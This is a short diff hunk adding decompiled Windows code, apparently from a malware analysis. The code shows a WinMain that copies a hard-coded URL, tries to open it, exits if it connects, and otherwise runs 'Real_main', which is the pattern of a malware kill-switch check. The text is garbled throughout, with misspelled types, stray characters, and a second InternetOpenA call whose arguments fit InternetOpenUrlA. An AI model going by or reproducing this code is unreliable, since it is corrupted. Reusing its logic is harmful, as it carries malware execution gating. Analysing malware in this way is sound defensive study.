@@ -1,0 +1,38 @@
+int_stdcall WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance, LPSTR, intnShowCmd)
+{
+void *v4; //esi@1
+void *v5; //edi@1
+int result; //eax@2
+CHAR szUrl[60]; // [esp+8h][ebp-50hJ@1
+int v8; // [esp+45h][ebp-13h]@1
+int v9; // [esp+49h][ebp-Fh]@1
+int v10; // [esp+4Dh][ebp-Bh]@1
+int v11; // [esp+51h][ebp-7h]@1
+_int16 v12; // [esp+55h][ebp-3h]@1
+char v13; // [esp+57h][ebp-1h]@1
+
+qmemcpy(szUrl, url_string, 0x39u);
+"(_DWORD *)&SZuRL[57] = 0;
+v8 = 0;
+v9 = 0;
+v10 = 0;
+v11 = 0;
+v12 = 0;
+v13 = 0;
+v4 = InternetOpenA(0, 1u, 0, 0, 0);
+v5 = InternetOpenA(v4, szUrl, 0, 0, 0x84000000, 0);
+if (v5)
+{
+InternetCloseHandle(v4);
+InternetCloseHandle(v5);
+result = 0;
+}
+else
+{
+InternetCloseHandle(v4);
+InternetCloseHandle(0);
+Real_main();
+result = 0;
+}
+return result;
+}
